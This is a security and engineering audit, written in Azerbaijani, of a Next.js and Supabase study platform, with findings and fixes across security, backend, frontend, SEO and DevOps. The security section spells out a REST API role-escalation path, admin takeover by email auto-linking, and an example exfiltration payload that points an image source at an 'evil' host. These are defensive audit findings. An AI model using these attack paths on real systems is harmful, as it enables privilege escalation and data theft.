# Study Platform — Çoxrollu Texniki Audit & Düzəliş Planı

**Layihə:** Study-main (Next.js 15 App Router + React 19 + Supabase Auth + PostgreSQL + next-intl 16 lokal)
**Analiz rolları:** Senior Backend, Senior Frontend, Senior UI, Senior SEO, Senior Fullstack, Senior Hacker (Pentest), Senior QA Engineer, Senior DevOps
**Tarix:** 2026-08-08

---

## İcmal

Bu hesabat iki müstəqil auditin birləşməsidir və hər tapıntı fakt kodla doğrulanıb (`file:sətir` referensları ilə). Ən kritik mövzu: **təhlükəsizlik sərhədi yalnız app kodudur** — RLS faktiki olaraq ölüdür Və policy-lərin özündə sütun səviyyəli escalation dəliyi var.

---

## 🔴 KRİTİK TAPINTILAR (dərhal həll edilməli)

| # | Problem | Prioritet | Mənbə | Status |
|---|---------|-----------|-------|--------|
| 1 | RLS `role` sütunu escalation (public REST API ilə istismar) | 🔴 Kritik | AI #2 | ✅ Tamamlandı |
| 2 | `db:reset` istehsal məlumatını silə bilər | 🔴 Kritik | AI #1 | ✅ Tamamlandı |
| 3 | Email ilə avtolink → admin privilege escalation | 🔴 Kritik | AI #1 | ✅ Tamamlandı |
| 4 | App superuser/service-role ilə qoşulur → RLS faktiki ölü | 🔴 Yüksək | AI #1 | ⬜ |
| 5 | İmzasız dev cookie + proqnozlaşdırıla bilən UUID-lər | 🔴 Yüksək | AI #1 | ✅ Tamamlandı |
| 6 | Heç bir CI/CD pipeline yoxdur | 🔴 Yüksək | Hər ikisi | ✅ Tamamlandı |
| 7 | Ölkə səhifələri orphan + 404 canonical | 🟠 Yüksək | AI #1 | ⬜ |
| 8 | Auth cookie marketing layout-da oxunur → ISR-i öldürür | 🟠 Yüksək | AI #1 | ✅ Tamamlandı |
| 9 | `devLogin`/`devStudentLogin` server-side yoxlamasız | 🟠 Yüksək | Hər ikisi | ✅ Tamamlandı |
| 10 | Authentikasiyasız fayl yükləmə (service-role + MIME spoof) | 🟠 Orta | AI #1 | ⬜ |

---

## 🔴 SENIOR HACKER / SECURITY

### 1. RLS `role` sütunu escalation — KRİTİK ⭐ ✅ Tamamlandı
**Fayl:** `supabase/migrations/0005_rls.sql:22`

```sql
create policy "profiles_update" on public.profiles for update
  using (id = auth.uid() or public.is_admin());
```

**Problem:** Policy-də `with check` yoxdur → PostgreSQL onu `using` ifadəsinə bərabər tutur. Tələbə öz `role='admin'`-ə dəyişəndə yeni sətirdə `id = auth.uid()` hələ də **true** qalır → icazə verilir. `0004_functions_triggers.sql`-də yalnız `updated_at` trigger-i var, role guard yoxdur. Anon key `NEXT_PUBLIC_`-dir, ona görə hücumçu birbaşa `PATCH /rest/v1/profiles?id=eq.<id>` çağırıb öz rolunu admin/consultant/editor-ə çevirə bilər. **Hazırda istismar edilə bilər.**

**Həll (trigger daha etibarlı, çünki `WITH CHECK` `OLD`-u görə bilmir):**
```sql
create or replace function public.prevent_self_role_change()
returns trigger language plpgsql security definer set search_path = public as $$
declare
  acting_uid uuid;
begin
  acting_uid := auth.uid();
  -- No auth context = privileged/service-role connection (trusted app path). Allow.
  if acting_uid is null then
    return new;
  end if;
  -- A real user session is changing a role. Only an admin may do this.
  if new.role <> old.role and not public.is_admin() then
    raise exception 'role change requires admin';
  end if;
  return new;
end; $$;

drop trigger if exists profiles_role_guard on public.profiles;
create trigger profiles_role_guard before update on public.profiles
  for each row execute function public.prevent_self_role_change();
```

**✅ Tətbiq edildi:** `supabase/migrations/0013_role_guard.sql` yaradıldı və `scripts/migrate.ts` `SKIP_LOCAL` siyahısına əlavə edildi (Supabase-only, `auth.uid()`/`is_admin()` asılıdır). Trigger auth context-i yoxlayır: service-role bağlantısı (`auth.uid() = NULL`, etibarlı app yolu) icazə alır; real istifadəçi sessiyası yalnız admin isə rol dəyişə bilər. Bu, app-in legitimate rol idarəetməsini qırmadan REST API escalation-u bağlayır.

### 2. App superuser/service-role → RLS faktiki ölü — YÜKSƏK
**Fayllar:** `src/lib/crm/db.ts:10`, `src/lib/supabase/server.ts:18`, `src/lib/crm/index.ts:8`, `src/lib/storage.ts:11`

**Problem:** Bütün DB sorğuları `DATABASE_URL` (`postgres` superuser) ilə, bütün Supabase əməliyyatları **service-role key** ilə işləyir. Hər ikisi RLS-i bypass edir → `0005_rls.sql` və `0009_storage_bucket.sql` policy-ləri **tamamilə hərəkətsiz**. Yeganə etibar sərhədi app kodudur; bir unudulmuş yoxlama = tam data breach. `createSupabaseCrm()` RLS-aware yol sadəcə stub-dır (`supabase-repository.ts:9`).

**Həll:** App sorğularını aşağı-imtiyazlı rol / anon+RLS üzərindən işlət, və ya hər repository metodunda defense-in-depth rol yoxlaması əlavə et.

### 3. Email ilə privilege escalation — KRİTİK ✅ Tamamlandı
**Fayl:** `src/lib/crm/pg-repository.ts:459` (`getStaffProfileByAuthUid`), `:443` (`upsertStudentByAuthUid`)

**Problem:** Supabase auth istifadəçisinin `auth_uid` match-i tapmasa email-ə görə avtomatik linkləyir: `update profiles set auth_uid=$1 where email=$2 returning *`. Hücumçu staff emaili altında Supabase sessiya qursa (email confirmation bağlı deyilsə və ya zəif OAuth) → admin profile-a `auth_uid` bağlanır → `getStaffSession()` (`session.ts:28`) admin hüququ verir.

**Həll:** Email ilə avtolink etmə. Staff profile `auth_uid` yalnız açıq admin provisioning addımı ilə qurulsun; `profiles.id = auth.uid()` istifadə edilsin (FK `0007`).

**✅ Tətbiq edildi:**
- `getStaffProfileByAuthUid` (`pg-repository.ts`): email-linking tamamilə silindi — yalnız `auth_uid` ilə resolve olunur, tapmasa `null` qaytarır.
- `upsertStudentByAuthUid` (`pg-repository.ts`): email-linking-ə `and role = 'student'` mühafizəsi əlavə edildi — staff/admin profile-lərinə auth_uid bağlanması bloklanır (zəhərlənmə qarşısı).
- `tests/unit/student-repository.test.ts`: test yeniləndi — artıq "email ilə escalation yoxdur" təhlükəsizlik xüsusiyyətini yoxlayır (admin auth_uid provisioning + email escalation cəhdi → null).

### 4. İmzasız dev-auth cookie + sabit UUID-lər — YÜKSƏK ✅ Tamamlandı
**Fayllar:** `src/lib/crm/session.ts:37`, `src/app/actions/admin-auth.ts:19`, `supabase/seed.sql:3`

**Problem:** `DEV_AUTH_ENABLED=1`-də `admin_session` cookie sadə JSON, imzalanmamış. Admin UUID-ləri sabit (`11111111-1111-1111-1111-111111111111`). Env flag production-a sızarsa hər kəs cookie qurub admin olur.

**Həll:** Cookie-ni server secret ilə imzala və `NODE_ENV !== 'production'` qoy (yalnız env flag deyil).

**✅ Tətbiq edildi:** `isDevAuthEnabled()` (`src/lib/crm/student-session.ts`) artıq `process.env.DEV_AUTH_ENABLED === '1' && process.env.NODE_ENV !== 'production'` qaytarır. Bu, bütün dev-auth subsistemini (cookie oxuyucuları + devLogin action-ları) production-da tamamilə inert edir — flag sızsa belə. İmzasız cookie və proqnozlaşdırıla bilən UUID riskləri bir yerdə neytrallaşdırıldı. (Mərhələ 1.2-də action-lara server-side guard da əlavə edildiyindən qoruma ikiqatdır.)

### 5. Authentikasiyasız fayl yükləmə — ORTA
**Fayl:** `src/app/actions/upload-apply-document.ts:19`

**Problem:** Public server action, heç bir auth/rate limit/ownership yoxdur. `file.type` klient tərəfindən idarə olunur (magic byte yoxlanılmır), service-role ilə işləyir, və `apply-documents` bucket-inin migration-i yoxdur (yalnız `application-documents` var, `0009_storage_bucket.sql`).

**Həll:** Per-IP rate limit + magic-byte sniff + fayl adı uzantısı allowlist + `apply-documents` bucket-i private olaraq migration ilə yarad.

### 6. Middleware heç bir qoruma etmir — ORTA ✅ Tamamlandı
**Fayl:** `src/middleware.ts:8`

**Problem:** Matcher `/admin|api|auth`-ı xaric edir, yalnız deprecated `getSession()` çağırır (əvəzinə `getUser()`), heç bir route qoruması yoxdur.

**Həll:** Mərkəzi admin gate əlavə et (auth-sız → `/admin/login` redirect), matcher-i daralt.

**✅ Tətbiq edildi:** `src/middleware.ts` yenidən yazıldı — (1) `getSession()` → `getUser()` (server-side JWT validation); (2) `/admin/*` (login xaric) üçün mərkəzi gate: Supabase sessiya və ya dev cookie yoxdursa `/admin/login` redirect (dev-auth-a hörmət edir; incə staff yoxlaması layout `requireStaff`-də qalır); (3) matcher-dən `admin` çıxarıldı ki, gate işləsin. Token refresh indi tək yerdir (B1-ə görə layout artıq session oxumur).

### 7. `changePasswordAction` `requireStaff()` çağırmır — AŞAĞI
**Fayl:** `src/app/actions/staff-management.ts:28`

**Problem:** Yalnız Supabase sessiyasına güvənir. Funksional cəhətdən düzgündür, amma əlavə müdafiə qatı yoxdur və Supabase xəta mesajı birbaşa klientə qaytarılır (`:39`).

**Həll:** `requireStaff()` + rate limit + generik xəta mesajları.

### 8. CSP `img-src … https:` — AŞAĞI
**Fayl:** `next.config.mjs:46`

**Problem:** İstənilən HTTPS host-a icazə verir → izləyici + data exfiltrasiya kanalı (`<img src=https://evil/?data>`).

**Həll:** Yalnız `images.unsplash.com`, `images.pexels.com`, `*.supabase.co`-a məhdudlaşdır.

### 9. CSP `unsafe-inline` (script + style) — AŞAĞI
**Fayl:** `next.config.mjs:41`

**Problem:** XSS qorumasını zəiflədir.

**Həll:** Per-request nonce (next/script) ilə production-dan `unsafe-inline`-ı çıxar.

### 10. PII loglanır — AŞAĞI
**Fayllar:** `src/app/auth/callback/route.ts:51` (`console.log('Session established for user:', email)`), `storage.ts:15,23`, `upload-apply-document.ts:42`

**Həll:** PII-ni info səviyyəsində loglama; generik xəta mesajları qaytar.

### 11. Rate limiter per-instance (serverless) — ORTA
**Fayl:** `src/lib/rate-limit.ts:10`

**Problem:** In-memory sliding window; Vercel-də hər instance öz sayğacı → real limit `max × instance`.

**Həll:** `@upstash/ratelimit` + Redis.

### 12. `/api/search` rate-limit yoxdur — ORTA
**Fayl:** `src/app/api/search/route.ts`

**Problem:** `ilike '%...%'` skanları, auth-sız, limitsiz → ucuz DoS.

**Həll:** `/api/chat`-dakı `rateLimit`/`getIpFromHeaders` köməkçisini tətbiq et.

### 13. Lead schema URL sahələrini doğrulamır — AŞAĞI
**Fayl:** `src/lib/validations/lead.ts:40`

**Problem:** `passportUrl` və s. `z.string()` — `javascript:…` keçə bilər.

**Həll:** `z.string().url()` və ya relative path doğrulaması.

**✅ Güclü tərəflər:** SQL injection yox (hər yerdə parameterized `$N`), server action-larda zod + ownership yoxlaması, role dəyişikliklərində last-admin mühafizəsi, service-role yalnız server-də, HSTS preload + `frame-ancestors 'self'` + `object-src 'none'`, open redirect bloklanır, admin noindex.

---

## 🟠 SENIOR BACKEND

### B1. Auth oxu marketing layout-da → bütün ISR-i öldürür — YÜKSƏK ✅ Tamamlandı
**Fayllar:** `src/app/[locale]/(marketing)/layout.tsx:18` → `lib/student-session-server.ts:13` → `lib/supabase/server-session.ts:9`

**Problem:** Layout hər sorğuda student session oxuyur → `cookies()` çağırır → bütün route tree dinamik olur. `revalidate = 3600` (`universities/[slug]/page.tsx:71`, blog, ölkə səhifələri) işləmir. Hər marketing səhifəsində Supabase auth round-trip + login-li tələbə üçün `upsertStudentByAuthUid()` write (`pg-repository.ts:443`).

**Həll:** Avatar/login-state-i kiçik client komponentə köçür; marketing səhifələri statik qalsın.

**✅ Tətbiq edildi:** Layout-dan `getStudentSessionForLayout()` silindi; `Header` artıq `session` prop almadan client-side `/api/me` fetch ilə sessiyanı həll edir (yeni `src/app/api/me/route.ts`). Cookie oxu `/api/me` route handler-ə köçdü — marketing səhifələri yenidən statik (ISR) render olunur. `useSearchParams` `window.location` ilə əvəzləndi (Suspense tələbi yoxdur). Middleware-dakı `getUser()` indi token refresh-in tək yeri (artıq layout-da redundant deyil).

### B2. Read-modify-write transaction-sız — ORTA
**Fayllar:** `src/lib/crm/pg-repository.ts:427` (`findOrCreateStudent`), `:443` (`upsertStudentByAuthUid`), `:459` (`getStaffProfileByAuthUid`)

**Problem:** `select → if → insert`, transaction və `on conflict` yox. `upsertStudentByAuthUid` hər auth sorğusunda (B1-ə görə) çağırılır; paralel ilk girişdə race → 23505 → 500.

**Həll:** `INSERT … ON CONFLICT (auth_uid) DO UPDATE … RETURNING *`.

### B3. İki ayrı pg.Pool eyni DB-yə — ORTA
**Fayllar:** `src/lib/data/index.ts:21` (max:2), `src/lib/crm/db.ts:10` (max:5)

**Problem:** 7+ bağlantı/instance; serverless-də `max_connections` (default 100) tükənir. `PGPOOL_MAX` yalnız bir pool-da hörmətlənir.

**Həll:** Tək `getPool()` paylaş, `PGPOOL_MAX` hər ikisinə tətbiq et.

### B4. `getDetail`/`getRelated` ardıcıl query-lər — AŞAĞI
**Fayl:** `src/lib/data/pg-data-repository.ts:226` (5 round-trip), `:274` (3 round-trip)

**Həll:** Müstəqil query-ləri `Promise.all` ilə paralelləşdir (səhifə özü `universities/[slug]/page.tsx:108`-də bunu düzgün edir).

### B5. DB→TS tipləri yoxlanılmış cast-lar — AŞAĞI
**Fayl:** `src/lib/data/pg-data-repository.ts:40-158`

**Problem:** Hər sütun `as string`. Schema drift səssizcə `undefined` verir.

**Həll:** Kritik sətirləri zod ilə doğrula.

### B6. `listLeads` limit 200, pagination yoxdur — AŞAĞI
**Fayl:** `src/lib/crm/pg-repository.ts:97`

**Problem:** İnkişaf etdikcə admin-də məlumat itir. Signed URL TTL 60s çox qısadır (`storage.ts:4`).

### B7. JSONB name ILIKE üçün index yoxdur — AŞAĞI
**Fayllar:** `pg-data-repository.ts:532,540`, `supabase/migrations/0012_search_indexes.sql`

**Həll:** `lower(name_i18n->>'en')` üzərində GIN trigram index.

**✅ Güclü tərəflər:** SQL injection səthi yox, mutation validation və abuse control (zod + honeypot + rate limit), listing-də batch CTE (N+1 yox), RLS dizayn koherent.

---

## 🟠 SENIOR FRONTEND

### F1. RTL elan edilib amma qırıqdır — YÜKSƏK
**Fayllar:** `src/i18n/routing.ts:33` (ar/fa/ur RTL), `src/app/[locale]/layout.tsx:69` (`dir`), fiziki utility-lər app boyu

**Problem:** `dir="rtl"` qoyulur, amma komponentlər fiziki Tailwind istifadə edir: `pl-10` (`hero-section.tsx:139`), `left-3`/`right-3` (`university-card.tsx:86,95`), drawer `right-0 … slide-in-from-right … border-l` (`StudentProfileDrawer.tsx:46-48`), hero `-left-5` (`:190`). RTL istifadəçilərində ikon/padding/haşiyə yanlış tərəfdə.

**Həll:** Məntiqi utility-lərə keç: `ps-*`/`pe-*`/`ms-*`/`me-*`/`start-*`/`end-*`/`rounded-s-*`/`rounded-e-*`/`text-start`/`text-end`/`border-s`/`border-e`; drawer-də dir-aware slide variantları.

### F2. ApplyForm 615 sətirlik God komponent — ORTA
**Fayl:** `src/components/sections/apply-form.tsx`

**Problem:** Təhsil+şəxsi+sənəd+yükləmə+göndərmə bir yerdə; raw `<select>` (`:234,257,364,376,447`) və başqa yerdə Radix Select (tutarsız); `Segmented` radiogroup (`:514`) oxş düyməsini dəstəkləmir.

**Həll:** Alt komponentlərə ayır, paylaşılan Select-i istifadə et, Radix `RadioGroup` və ya roving tabindex əlavə et.

### F3. Apply səhifəsi tam data qrafını client-ə göndərir — YÜKSƏK
**Fayllar:** `src/app/[locale]/(marketing)/apply/page.tsx:40` → `apply-form.tsx:47`

**Problem:** `universities.list()` və `programs.list()` tam obyektləri (18 lokal `LocalizedString`, gallery, heroImage) serializə olunur; forma yalnız `{id,slug,name}` lazımdır.

**Həll:** Server-də minimik proyeksiya (`universities.map(u => ({ id, slug, name }))`).

### F4. UniversityCard N+1 — YÜKSƏK
**Fayl:** `src/components/sections/university-card.tsx:43`

**Problem:** `listingMetadata` verilməsə hər kart 3 query. `listingMetadata` ötürməyən çağırıcılar: related (`universities/[slug]/page.tsx:500`), ölkə (`study-in-turkey-from/[country]/page.tsx:219`), proqramlar (`programs/[category]/[city]/page.tsx:287`).

**Həll:** `getListingMetadata` batch nümunəsini (`universities/page.tsx:53`) paylaş.

### F5. FadeIn `opacity-0` məzmunu gizlədir — ORTA
**Fayl:** `src/components/sections/motion/fade-in.tsx:32`

**Problem:** JS sönsə/gözlənilsə bölmələr görünmür (git tarixində bu artıq baş verib: `37d2f99`, `bdf9a9b`).

**Həll:** Default görünən; yalnız mount-dan sonra `useEffect` ilə gizlə.

### F6. Mobil-də sign-in/profile girişi yoxdur — YÜKSƏK ✅ Tamamlandı
**Fayl:** `src/components/layout/header.tsx:84` (`hidden sm:block`), `:122` (mobil menü)

**Problem:** Telefonlarda (<640px) authenticate etmək mümkün deyil, amma "Apply" funnel-i auth tələb edir.

**Həll:** Auth blokunu mobil menüya əlavə et.

**✅ Tətbiq edildi:** `Header` mobil menüsünə `{AuthControl()}` əlavə edildi — indi telefonlarda da sign-in/profile girişi var. Eyni auth kontrolu desktop və mobil-da paylaşılır (tək `/api/me` fetch).

### F7. Hero LCP şəkli next/image deyil — YÜKSƏK
**Fayl:** `src/components/sections/hero-section.tsx:184`

**Problem:** Raw Unsplash CSS background — AVIF/WebP yox, `priority` yox, mobil-də tamamilə gizli.

**Həll:** `<Image fill priority sizes=… />` (universitet detal səhifəsindəki `:176` nümunəsi kimi).

### F8. i18n label prop-drilling — ORTA
**Fayllar:** `universities/page.tsx:70` → `university-filters.tsx:26`; `programs/page.tsx:87` → `program-filters.tsx:31`

**Problem:** `NextIntlClientProvider` artıq bütün mesajları göndərir (`layout.tsx:61`), amma server səhifələri 10-15 tərcüməni `labels` obyektində client-ə drill edir.

**Həll:** `labels` prop-larını at, client komponentlərində birbaşa `useTranslations` çağır.

### F9. Hardcoded İngilis CTA + tutarsız apply hədəfi — ORTA
**Fayl:** `src/components/layout/FloatingApplyButton.tsx:16,19`

**Problem:** Literal `Apply Now` (tərcüməsiz); hədəf `/${locale}/dashboard/login`, halbuki header `:88` `/dashboard/login`, mobil `:141` `/apply`.

**Həll:** `useTranslations` ilə tərcümə et, apply hədəfini standartlaşdır.

### F10. Ana səhifədə təkrar full-list fetch — ORTA
**Fayllar:** `stats-section.tsx:13`, `featured-universities.tsx:17`

**Həll:** Ortaq oxuları `page.tsx`-ə qaldır və ya React `cache()` ilə dedup et.

**✅ Güclü tərəflər:** Server-component-first, Next 15 üçün düzgün `params` Promise `await`, `setRequestLocale`, ISR, müdafiəli `generateStaticParams`.

---

## 🟡 SENIOR UI/UX

### U1. Dark mode konfiqurasiya edilib amma yarımçıq — ORTA
**Fayllar:** `tailwind.config.ts:4` (`darkMode:['class']`), `globals.css` (hardcode hex)

**Problem:** `.dark{}` bloku yoxdur, toggle yoxdur; konfiqurasiya yanıldıcıdır.

**Həll:** Ya `darkMode`-u sil, ya da token-ləri CSS variable-lərinə çevir (light + `.dark`).

### U2. Chat widget dialoq semantikası yoxdur — ORTA
**Fayl:** `src/components/layout/chat-widget.tsx:72`

**Problem:** `role="dialog"`/`aria-modal` yox, fokus tələsi yox, Escape yox, və `aria-label` **tərsinə** işlənib (`:74` açıkanda "closed" deyir).

**Həll:** Radix `Dialog` üzərindən qur, label-i state-ə görə düzəlt.

### U3. Blog-da rich-text yoxdur — ORTA
**Fayl:** `src/app/[locale]/(marketing)/blog/[slug]/page.tsx:124`

**Problem:** Məzmun `lx(content).split('\n')` → hər sətir `<p>`. Başlıq/list/link/şəkil yoxdur. `prose` sinifi ölüdür (`@tailwindcss/typography` quraşdırılmayıb).

**Həll:** `@tailwindcss/typography` quraşdır və ya MDX/strukturlu məzmun render et.

### U4. `h-4.5 w-4.5` yararsız Tailwind sinifləri — AŞAĞI
**Fayl:** `src/components/student/StudentProfileDrawer.tsx:124,141`

**Həll:** `h-4 w-4`/`h-5 w-5` və ya `4.5`-i `theme.extend.spacing`-ə əlavə et.

### U5. CostCalculator lokalı iqnor edir — AŞAĞI
**Fayl:** `src/components/sections/cost-calculator.tsx:168`

**Həll:** `lib/utils`-dən `formatCurrency(amount, 'USD', locale)` istifadə et, `useLocale()` ilə oxu.

### U6. Üç floating widget kiçik ekranda toqquşur — AŞAĞI
**Fayllar:** `chat-widget.tsx:75`, `whatsapp-float.tsx:18`, `FloatingApplyButton.tsx:17`

**Həll:** Koordinasiya edilmiş "floating actions" konteyneri.

### U7. Tək `loading.tsx` listings skeleton-dur — AŞAĞI
**Fayl:** `src/app/[locale]/(marketing)/loading.tsx`

**Həll:** Route-spesifik `loading.tsx` faylları.

**✅ Güclü tərəflər:** Token gigiyenası (semantik rənglər, `flat-plus` kölgələr, real type scale, `container-page`/`section-padding`), a11y bazası (skip link, `:focus-visible`, `prefers-reduced-motion`, ARIA).

---

## 🟢 SENIOR SEO

### S1. Ölkə səhifələri orphan + 404 canonical — KRİTİK ⭐ ✅ Tamamlandı
**Fayllar:** `src/app/[locale]/(marketing)/study-in-turkey-from/[country]/page.tsx:53,78`

**Problem:** Route `/study-in-turkey-from/germany` (slash) istehsal edir, amma səhifə `path = /study-in-turkey-from-germany` (defis) yazır → **bütün canonical/hreflang/breadcrumb 404-a işarələnir**. Sitemap-da yoxdur (`sitemap.ts:30`), heç bir daxili link yoxdur. `public/robots.txt:16` defis formasına allow verir → route və SEO qatı sinxron deyil.

**Həll:** `path`-i slash formasına düzəlt (`/study-in-turkey-from/${country}`), sitemap-a əlavə et, daxili link bloku əlavə et.

**✅ Tətbiq edildi:** (1) `page.tsx`-də `path` hər yerdə slash formasına düzəldildi (`study-in-turkey-from/${country}`) → canonical/hreflang/breadcrumb indi real URL-ə işarələyir. (2) `sitemap.ts`-ə `data.countries.list()` ölkə URL-ləri əlavə edildi (priority 0.7) — artıq orphan deyil. (Daxili link bloku UI dəyişikliyidir, gələcək mərhələdə.)

### S2. Bütün URL-lər placeholder domain-dən — YÜKSƏK ✅ Tamamlandı
**Fayl:** `src/config/site.ts:6` (`url: 'https://studyhub.example'`)

**Problem:** `NEXT_PUBLIC_SITE_URL` oxumur. Hər canonical/OG/hreflang/sitemap/JSON-LD `studyhub.example`-ə işarələnir.

**Həll:** `process.env.NEXT_PUBLIC_SITE_URL`-dən oxu (`dashboard/login/page.tsx:20`-də artıq belə istifadə olunur).

**✅ Tətbiq edildi:** `siteConfig.url` indi `(process.env.NEXT_PUBLIC_SITE_URL ?? 'https://studyhub.example').replace(/\/$/, '')` — production-da env-dən oxunur, trailing slash təmizlənir. Bütün canonical/OG/sitemap/robots/JSON-LD avtomatik düzgün domain istifadə edir.

### S3. OG/Twitter şəkli 404 — YÜKSƏK ✅ Tamamlandı
**Fayl:** `src/lib/seo/alternates.ts:50` (`/og.png`), `public/`-da yoxdur

**Problem:** `buildPageMetadata` hər səhifədə `/og.png` qoyur → `opengraph-image.tsx` generatorunu override edir → hər paylaşmada qırıq şəkil.

**Həll:** Real `/public/og.png` (1200×630) əlavə et və ya `images`-ı `buildPageMetadata`-dan çıxar.

**✅ Tətbiq edildi:** `buildPageMetadata` (`alternates.ts`) indi yalnız per-page `image` verildikdə `images` qoyur; əks halda omit edir ki, file-based `src/app/opengraph-image.tsx` generatoru tətbiq olunsun (Next onu həm og:image, həm twitter:image üçün istifadə edir). `siteConfig.ogImage` reference silindi.

### S4. İki ziddiyyətli robots.txt — ORTA ✅ Tamamlandı
**Fayllar:** `public/robots.txt` vs `src/app/robots.ts`

**Problem:** Statik fayl dinamik route-u kölgələyir; placeholder domain + yanlış defis pattern.

**Həll:** `public/robots.txt`-i sil, tək `app/robots.ts` saxla.

**✅ Tətbiq edildi:** `public/robots.txt` silindi (`git rm`). `src/app/robots.ts` indi tək mənbədir və `siteConfig.url` (env-driven, S2) istifadə edir.

### S5. 6 "stub" lokal indexlənə bilər amma tərcüməsiz — YÜKSƏK ✅ Tamamlandı
**Fayllar:** `src/config/site.ts:67` (`INCOMPLETE_LOCALES`), `src/i18n/routing.ts:4`, `src/app/[locale]/layout.tsx`

**Problem:** bg/id/so/ur/uz/sw sitemap/hreflang-dan xaric edilib, amma `noindex` yoxdur, routing-də aktivdir → kəşf olunanda zəif məzmun siqnalı.
**Doğrulanmış i18n boşluğu:** 4 lokal (az/en/ru/tr) 21 namespace, 14 lokal (ar/bg/de/fa/fr/id/kk/ky/so/sw/tk/ur/uz/zh) 19 namespace — 2 namespace (Geo/Ölkə) çatışmır.

**Həll:** `INCOMPLETE_LOCALES` üçün `robots: { index: false }` əlavə et (layout `generateMetadata`-də), və ya routing-dən çıxana qədər gözlə.

**✅ Tətbiq edildi:** Yeni `isIncompleteLocale()` (`config/site.ts`) ixrac edildi; `[locale]/layout.tsx` `generateMetadata` natamam lokallar üçün `robots: { index: false, follow: false }` qoyur. Bu lokallar hələ də render olunur (birbaşa ziyarət üçün), amma indexlənmir.

### S6. Birinci tərəf aggregateRating — ORTA
**Fayl:** `src/lib/seo/json-ld.ts:70`

**Problem:** Google özünü-refleksiya reytinqlərini cəzalandırır.

**Həll:** Götür və ya üçüncü tərəf mənbəyi (Trustpilot) ilə əvəz et (`sameAs`).

### S7. Sitemap `lastmod` hər URL üçün `new Date()` — ORTA
**Fayl:** `src/app/sitemap.ts:22`

**Problem:** Hər deploy-də dəyişir, Google iqnor edir.

**Həll:** Real `updatedAt` istifadə et və ya omit et.

### S8. SearchAction `?q=` ≠ səhifə `?search=` — ORTA
**Fayllar:** `src/lib/seo/json-ld.ts:46` vs `src/lib/universities/listing-query.ts:38`

**Həll:** JSON-LD-də `?search={search_term_string}` işlət.

### S9. `og:locale` bare kod — AŞAĞI
**Fayl:** `src/lib/seo/alternates.ts:76`

**Həll:** `en→en_US`, `tr→tr_TR`, `az→az_AZ` maplə.

### S10. `/dashboard/login` noindex yoxdur — AŞAĞI
**Fayl:** `src/app/[locale]/dashboard/login/page.tsx`

**Həll:** `export const metadata = { robots: { index: false, follow: false } }`.

### S11. CollegeOrUniversity logo SVG favicon — AŞAĞI
**Fayl:** `src/lib/seo/json-ld.ts:65`

**Həll:** PNG ≥112×112 `ImageObject` ilə (width/height).

**✅ Güclü tərəflər:** Self-referencing canonical, 12-lokalı hreflang + `x-default`, geniş JSON-LD (Organization, CollegeOrUniversity, FAQ, HowTo, Breadcrumb, Article, ItemList), filtr parametrləri canonical-dan təmizlənir, dashboard/admin noindex, sitemap 50k chunk dəstəyi hazır.

---

## 🔵 SENIOR FULLSTACK / ARXİTEKTURA

### A1. İkili auth sistemi çaşqınlıq yaradır — ORTA
Supabase Auth + ayrı "dev fallback" cookie (`admin_session`, `student_session`) paralel. Supabase Auth tam hazır olanda dev fallback tamamilə silinməlidir.

### A2. Ölkə landing route-u `/[country]/` folder ilə, amma URL `/study-in-turkey-from-${country}` gözləyir — sinxron deyil (S1-ə bax).

### A3. Student action-lar dev fallback-i bypass edir + cache revalidation skip — ORTA ✅ Tamamlandı
**Fayl:** `src/app/actions/student.ts:14,26,56`

**Problem:** `sendStudentMessage`, `uploadStudentDocument`, və `markThreadReadAction` `getStudentSession()` (Supabase-only) çağırır, dashboard səhifələri isə `requireStudentAny()` (Supabase + dev). Dev-də demo tələbə dashboard-u görür amma hər mutation `Not authenticated` qaytarır.

**Həll:** `requireStudentAny` (və ya shared resolver) istifadə et, mutation-dan sonra revalidate et.

**✅ Tətbiq edildi:** Yeni `getStudentSessionAny()` (`lib/crm/student-session.ts`) — `(Supabase ?? dev)` redirect-siz. Üç action-da `getStudentSession` → `getStudentSessionAny`. Revalidation haqqında: bütün dashboard səhifələri `force-dynamic`-dir, ona görə mutation-lar dərhal görünür; `revalidateTag('student-documents')` zərərsiz no-op qalır.

---

## ⚙️ SENIOR DEVOPS

### D1. CI/CD pipeline tamamilə yoxdur — KRİTİK ✅ Tamamlandı
**Yer:** `.github/workflows/` — **mövcud deyil**

**Problem:** `lint`/`typecheck`/`test`/`test:e2e`/`build` script-ləri (`package.json:9`) heç vaxt işləmir. FadeIn kimi UI bug-lar (`37d2f99`, `bdf9a9b`) main-ə düşür.

**Həll:** `.github/workflows/ci.yml` → `npm ci && npm run lint && npm run typecheck && npm run test && npm run build`; ayrıca Playwright e2e job (`webServer` artıq konfiqurasiya edilib, `playwright.config.ts:21`).

**✅ Tətbiq edildi:** `.github/workflows/ci.yml` yaradıldı — 2 job: (1) `lint-typecheck` (sürətli, DB-siz); (2) `test-build` (Postgres 16 service + migrate+seed + unit test + production build). `push`/`pull_request`-da işləyir, `concurrency` ilə eyni branch-də köhnə run-ları ləğv edir.

### D2. `db:reset` istehsal məlumatını silə bilər — KRİTİK ✅ Tamamlandı
**Fayl:** `scripts/migrate.ts:38,47-52`

**Problem:** `DROP SCHEMA public CASCADE`, heç bir təsdiq/environment yoxlaması yoxdur. Yanlış env = tam məlumat itkisi.

**Həll:** Yalnız `localhost`/`127.0.0.1`/`DEV` marker-i olan `DATABASE_URL`-də icazə ver + interaktiv `ARE_YOU_SURE` təsdiqi.

**✅ Tətbiq edildi:** `scripts/migrate.ts`-ə `isLocalDatabase(url)` yoxlaması əlavə edildi — `--reset` yalnız `localhost|127.0.0.1|0.0.0.0|.local|DEV` ehtiva edən `DATABASE_URL`-də işləyir; əks halda aydın xəta atır.

### D3. Build-də env validation yoxdur — YÜKSƏK ✅ Tamamlandı
**Yer:** `src/lib/env.ts` — **mövcud deyil**

**Problem:** Typo'lu deploy build-i keçir, istifadəçi DB-yə toxunanda çökür (`dev-err.txt` artifact-ləri bunu göstərir).

**Həll:** Zod validation (`@t3-oss/env-nextjs` və ya custom) + `next.config.mjs`-də import.

**✅ Tətbiq edildi:** `next.config.mjs`-ə `assertEnv()` əlavə edildi — production build-də (`NODE_ENV==='production'`) `DATABASE_URL` həmişə, Supabase var-ları isə yalnız `SUPABASE_ENABLED==='true'`-da tələb olunur; çatışmayan zaman aydın xəta ilə build-i dayandırır. Dev/lint rejimində lenient (CI-də DB-siz lint işləyir).

### D4. `global-error.tsx` yoxdur — YÜKSƏK ✅ Tamamlandı
**Yer:** yalnız `src/app/[locale]/(marketing)/error.tsx` var

**Problem:** Root layout/admin/dashboard xətaları Next-in ağ ekranını göstərir.

